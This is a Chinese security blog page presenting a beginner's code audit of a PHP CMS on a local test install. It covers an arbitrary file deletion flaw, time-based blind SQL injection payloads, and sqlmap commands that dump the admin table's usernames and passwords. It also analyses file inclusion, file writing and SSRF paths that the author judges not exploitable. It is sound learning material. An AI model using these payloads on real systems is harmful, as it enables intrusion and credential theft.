@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>代码审计初尝 | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" cms ">
+  <meta name="description" content="代码审计初尝 | prontosil&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="关于我">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://prontosil.com/about/index.html">
+<meta property="og:site_name" content="prontosil&#39;s Blog">
+<meta property="og:description" content="关于我">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-30T01:19:01.000Z">
+<meta property="article:modified_time" content="2020-01-30T01:20:22.385Z">
+<meta property="article:author" content="prontosil">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//https-prontosil-club.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>prontosil</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/xinyongpeng" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+        <a title="jianshu" href="https://www.jianshu.com/u/7b4cb9cdc0c8" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-jianshu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="zhihu" href="https://www.zhihu.com/people/he-yan-52-34" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-zhihu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="csdn" href="https://blog.csdn.net/qq_41645130" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-csdn"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1365155759@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1365155759&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(14)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="生活">生活<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="编程">编程<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="14">
+<input type="hidden" id="yelog_site_word_count" value="9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxe</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xml</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">java</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">反序列化</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xxd</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">hexdump</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">汇编</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">dosbox</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Apache</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">RCE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SSI</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">截断</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/posts/5d5d07b8/"
+           data-tag="JavaScript"
+           data-author="" >
+            <span class="post-title" title="JavaScript原型链污染">JavaScript原型链污染</span>
+            <span class="post-date" title="2020-01-30 09:13:31">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/2e545689/"
+           data-tag="xxe,xml"
+           data-author="" >
+            <span class="post-title" title="XXE复习">XXE复习</span>
+            <span class="post-date" title="2020-01-30 07:48:51">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/21b61fbe/"
+           data-tag="java,反序列化"
+           data-author="" >
+            <span class="post-title" title="java审计笔记">java审计笔记</span>
+            <span class="post-date" title="2020-01-30 09:05:39">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/1f38a4f2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="safeharbor靶机渗透">safeharbor靶机渗透</span>
+            <span class="post-date" title="2020-01-31 19:35:18">2020/01/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/3d16ce36/"
+           data-tag="php,函数"
+           data-author="" >
+            <span class="post-title" title="php常用函数">php常用函数</span>
+            <span class="post-date" title="2020-01-30 17:15:35">2020/01/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/5877398d/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="upload-lab做题笔记">upload-lab做题笔记</span>
+            <span class="post-date" title="2020-01-30 21:17:58">2020/01/30</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/posts/728b20a1/"
+           data-tag="cms"
+           data-author="" >
+            <span class="post-title" title="代码审计初尝">代码审计初尝</span>
+            <span class="post-date" title="2020-02-01 10:31:26">2020/02/01</span>
+        </a>
+        
+        <a  class="生活 "
+           href="/posts/b69cd839/"
+           data-tag="域名"
+           data-author="" >
+            <span class="post-title" title="域名解析记录">域名解析记录</span>
+            <span class="post-date" title="2020-01-30 10:40:56">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/f1616294/"
+           data-tag="Linux,dig"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-dig">每天一个Linux命令-dig</span>
+            <span class="post-date" title="2020-01-30 10:45:02">2020/01/30</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/2e8d4a2a/"
+           data-tag="xxd,hexdump"
+           data-author="" >
+            <span class="post-title" title="每天一个Linux命令-xxd">每天一个Linux命令-xxd</span>
+            <span class="post-date" title="2020-01-31 19:35:51">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/734660ee/"
+           data-tag="leetcode"
+           data-author="" >
+            <span class="post-title" title="每天一道leetcode-数组题">每天一道leetcode-数组题</span>
+            <span class="post-date" title="2020-01-30 10:45:29">2020/01/30</span>
+        </a>
+        
+        <a  class=""
+           href="/posts/2e6a5f8a/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="每天以一道leetcode-链表题">每天以一道leetcode-链表题</span>
+            <span class="post-date" title="2020-01-31 19:35:34">2020/01/31</span>
+        </a>
+        
+        <a  class="编程 "
+           href="/posts/57418b7f/"
+           data-tag="汇编,dosbox"
+           data-author="" >
+            <span class="post-title" title="汇编从入门到入土一">汇编从入门到入土一</span>
+            <span class="post-date" title="2020-02-01 22:02:40">2020/02/01</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/posts/becfc22d/"
+           data-tag="文件上传,Apache,RCE,SSI,截断"
+           data-author="" >
+            <span class="post-title" title="漏洞复现-Apache SSI远程命令执行">漏洞复现-Apache SSI远程命令执行</span>
+            <span class="post-date" title="2020-01-30 10:48:35">2020/01/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-代码审计初尝" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">代码审计初尝</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="代码审计">代码审计</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">cms</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-01 22:13:30'>2020-02-01 10:31</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.2k</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件删除"><span class="toc-text">任意文件删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后台注入"><span class="toc-text">后台注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#延时注入"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另一处后台注入"><span class="toc-text">另一处后台注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意写文件"><span class="toc-text">任意写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>全文参考了国光的文章 <a href="https://www.sqlsec.com/2020/01/sinsiu.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/sinsiu.html</a></p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p>
+<pre><code class="php">function del_file()
+{
+    $path = post(&#39;path&#39;);
+    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);
+    $dir[0] = &#39;data/backup/&#39;;
+    $dir[1] = &#39;images/&#39;;
+    $dir[2] = &#39;resource/&#39;;
+    $flag = false;
+    for($i = 0; $i &lt; count($dir); $i ++)
+    {
+        if(substr($path,0,strlen($dir[$i])) == $dir[$i])
+        {
+            $flag = true;
+        }
+    }
+    if($flag)
+    {
+        if(unlink($path))
+        {
+            $result = 1;
+        }
+    }
+    echo isset($result) ? $result : 0;
+}</code></pre>
+<p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p>
+<p>成功删除文件</p>
+<h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p>
+<p><img src="/posts/728b20a1/1580563920089.png" alt></p>
+<p>延时注入的其他例子</p>
+<pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 
+cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) 
+# 延时 表明当前数据库长度为 6 
+cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) 
+# 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 
+cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) 
+# 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; 
+cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) 
+# 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 
+cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) 
+# 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; 
+cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p>
+<p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p>
+<p><img src="/posts/728b20a1/1580563976163.png" alt></p>
+<p>但是我按照国光的方法使用 sqlmap 失败了</p>
+<pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p>
+<h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p>
+<pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);
+    $obj = new goods();
+    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);
+    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);
+    $obj-&gt;set_where(&#39;goo_channel_id = &#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre>
+<p>这里忘记过滤了</p>
+<pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre>
+<p><img src="/posts/728b20a1/1580564002356.png" alt></p>
+<p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p>
+<pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p>后面的几个是菜鸡自己的分析，但是都不是漏洞23333</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p>
+<p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p>
+<pre><code class="php">    global $global;
+    $global = array();
+    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);
+    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);
+    if($global[&#39;url&#39;] != &#39;&#39;)
+    {
+        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符
+        $global[&#39;channel&#39;] = $arr[1];
+        var_dump($global);</code></pre>
+<p><img src="/posts/728b20a1/1580564015011.png" alt></p>
+<pre><code class="php">function main()
+{
+    global $global,$smarty;
+    set_global();
+    include_all(&#39;admin/class&#39;);
+    set_more_global();
+    $path = &#39;admin/admin.php&#39;;
+    if($global[&#39;url&#39;] != &#39;&#39;)
+    {
+        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控
+        var_dump(file_exists($path2));
+        if(file_exists($path2))
+        {
+            $path = $path2;
+        }
+    }
+    include($path);
+}</code></pre>
+<p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p>
+<p><code>admin/common.func.php</code> 文件中</p>
+<pre><code class="php">function run($parameter)
+{
+    global $smarty;
+    $path = &#39;&#39;;
+    $display = &#39;&#39;;
+    extract($parameter); //extract函数存在变量覆盖，但是参数不可控
+    $func = &#39;module_&#39;.$module;
+    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);
+    $func($parameter);
+    if($display != &#39;no&#39;)
+    {
+        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);
+    }
+}</code></pre>
+<h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p>
+<p><img src="/posts/728b20a1/1580564028890.png" alt></p>
+<p>当然此处是可以随意修改文件的，只是没办法写shell</p>
+<p><img src="/posts/728b20a1/1580564041634.png" alt></p>
+<p>可见过滤还是挺严格的</p>
+<p><img src="/posts/728b20a1/1580564050184.png" alt></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p>
+<p>可以获取远程图片</p>
+<p>首先必须是 http开头的</p>
+<pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){
+                array_push( $tmpNames , &quot;error&quot; );
+                continue;
+            }</code></pre>
+<p>校验了后缀名</p>
+<pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );
+            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {
+                array_push( $tmpNames , &quot;error&quot; );
+                continue;
+            }</code></pre>
+<p>相关的白名单</p>
+<pre><code class="php">    $config = array(
+        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径
+        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式
+        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB
+    );</code></pre>
+<p>之后会读取文件</p>
+<pre><code class="php">readfile( $imgUrl,false,$context);</code></pre>
+<p>这么看来感觉问题不大</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>代码审计初尝</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.2k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-02-01, 10:31:26</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-01, 22:13:30</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/728b20a1/" title="代码审计初尝">http://prontosil.com/posts/728b20a1/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <section id="comments" class="disqus">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://prontosil.com/posts/728b20a1/';
+            this.page.identifier = 'posts/728b20a1/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//https-prontosil-club.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a>
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var isLoadComments = false;
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            if(isLoadComments){
+                return;
+            }
+            isLoadComments = true;
+            if(isLoadComments )
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").mouseenter(function(){
+            load$hide();
+        })
+    </script>
+
+
+</section>
+
+<!-- Add comment count-->
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/728b20a1/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/728b20a1/"></span>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2020 prontosil</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#JavaScript','#xxe','#xml','#java','#反序列化','#php','#函数','#文件上传','#cms','#域名','#Linux','#dig','#xxd','#hexdump','#leetcode','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
